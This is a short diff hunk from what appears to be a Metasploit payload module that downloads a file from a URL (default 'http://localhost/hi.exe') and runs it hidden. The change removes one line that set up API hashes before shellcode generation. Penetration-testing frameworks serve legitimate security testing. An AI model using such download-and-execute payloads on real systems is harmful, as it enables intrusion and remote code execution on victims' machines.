@@ -37,7 +37,6 @@ module MetasploitModule
   end
 
   def generate(_opts = {})
-    block_api_iv # ensure the block API IV is generated before we generate the shellcode so that the hashes are correct
     url = datastore['URL'] || 'http://localhost/hi.exe'
     file = datastore['FILEPATH'] || 'fox.exe'
     display = datastore['DISPLAY'] || 'HIDE'
